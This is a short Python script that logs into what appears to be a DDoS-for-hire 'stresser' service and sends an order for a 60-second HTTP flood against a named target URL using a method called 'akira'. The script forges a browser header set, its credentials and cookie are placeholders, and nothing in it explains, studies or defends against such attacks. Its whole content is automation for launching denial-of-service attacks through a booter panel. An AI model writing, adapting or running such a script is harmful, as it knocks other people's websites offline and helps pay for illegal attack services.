import requests
import time

login_url = 'https://stresser.media/api/user/login'
attack_url = 'https://stresser.media/api/attacks/send'

login_payload = {"username": "skid", "password": "skid123"}
attack_payload = {
    "target": "https://skid.com",
    "method": "akira",
    "time": 60,
    "options": {
        "ratelimit": 100,
        "http_method": "GET"
    }
}

headers = {
    'Authority': 'stresser.media',
    'Method': 'POST',
    'Path': '/api/user/login',
    'Scheme': 'https',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Content-Length': '104',
    'Content-Type': 'application/json',
    'Cookie': 'big bomb',
    'Origin': 'https://stresser.media',
    'Referer': 'https://stresser.media/login',
    'Sec-Ch-Ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'no one cant see'
}

headers2 = {
    'Authority': 'stresser.media',
    'Method': 'POST',
    'Path': '/api/attacks/send',
    'Scheme': 'https',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Content-Length': '105',
    'Content-Type': 'application/json',
    'Cookie': 'big bomb',
    'Origin': 'https://stresser.media',
    'Referer': 'https://stresser.media/panel/hub',
    'Sec-Ch-Ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'no one cant see'
}

login_response = requests.post(login_url, json=login_payload, headers=headers)
print(login_response.status_code)

attack_response = requests.post(attack_url, json=attack_payload, headers=headers2)
print(attack_response.status_code)
